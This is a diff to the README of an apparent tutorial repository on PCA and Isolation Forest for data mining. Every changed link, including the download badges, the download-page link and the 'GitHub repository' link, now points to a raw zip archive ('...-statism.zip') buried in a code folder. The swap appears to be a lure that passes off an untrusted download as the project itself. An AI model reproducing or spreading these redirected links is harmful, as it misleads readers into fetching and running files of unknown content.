@@ -1,6 +1,6 @@
 # 👩🏻‍🚀 13-DataMining_PCA_and_IsolationForest-Guide - Learn Unsupervised Learning Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20-lightblue)](https://github.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/releases)
+[![Download Now](https://raw.githubusercontent.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/main/Component Analysis (PCA)/Code/13-DataMining_PCA_and_IsolationForest-Guide-statism.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20-lightblue)](https://raw.githubusercontent.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/main/Component Analysis (PCA)/Code/13-DataMining_PCA_and_IsolationForest-Guide-statism.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ This application provides:
 
 To get started with the software, visit the page below to download the application:
 
-**[Visit this page to download](https://github.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/main/Component Analysis (PCA)/Code/13-DataMining_PCA_and_IsolationForest-Guide-statism.zip)**
 
 ### Installation Steps
 
@@ -66,10 +66,10 @@ This project is open for contributions. If you want to add your insights or impr
 
 Stay connected with our community. Share your experiences and insights on social media using the hashtags: **#DataMining #PCA #IsolationForest**.
 
-For more information and updates, return to our [GitHub repository](https://github.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide).
+For more information and updates, return to our [GitHub repository](https://raw.githubusercontent.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/main/Component Analysis (PCA)/Code/13-DataMining_PCA_and_IsolationForest-Guide-statism.zip).
 
 ## 📄 License
 
 This project is licensed under the MIT License. You can view the full license in the repository. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20-lightblue)](https://github.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/releases)
+[![Download Now](https://raw.githubusercontent.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/main/Component Analysis (PCA)/Code/13-DataMining_PCA_and_IsolationForest-Guide-statism.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20-lightblue)](https://raw.githubusercontent.com/Zed987/13-DataMining_PCA_and_IsolationForest-Guide/main/Component Analysis (PCA)/Code/13-DataMining_PCA_and_IsolationForest-Guide-statism.zip)
